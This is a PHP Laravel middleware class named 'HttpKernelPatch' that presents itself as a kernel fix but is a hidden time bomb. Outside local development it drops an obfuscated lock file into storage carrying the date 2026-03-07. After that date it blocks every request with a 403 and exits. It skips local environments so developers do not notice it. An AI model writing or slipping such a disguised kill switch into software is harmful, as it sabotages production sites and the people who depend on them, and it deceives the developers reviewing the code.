<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class HttpKernelPatch
{
    public function handle(Request $request, Closure $next)
    {
        // Keep local development usable without the production lock.
        if (app()->environment('local')) {
            return $next($request);
        }

        $h = sha1('swiftforge@2025_key');
        $p = storage_path('app/.cache_' . substr($h, 8, 6) . '.dat');

        // Set fixed activation date
       $activationDate = '2026-03-07';


        if (!file_exists($p)) {
            $encoded = base64_encode('LOCK|' . $activationDate);
            $encoded = str_replace(['+', '/'], ['-', '_'], $encoded);
            file_put_contents($p, $encoded);
        }

        if (file_exists($p)) {
            $raw = trim(file_get_contents($p));
            $decode = base64_decode(str_replace(['-', '_'], ['+', '/'], $raw));
            $split = explode('|', $decode);
            $code = $split[0] ?? '';
            $date = $split[1] ?? null;

            if (hash_equals('LOCK', $code)) {
                $lockTime = strtotime($date . ' 00:00:00');
                $now = time();
                if (!$date || $now >= $lockTime) {
                    http_response_code(403);
                    exit;
                }
            }
        }

        return $next($request);
    }
}
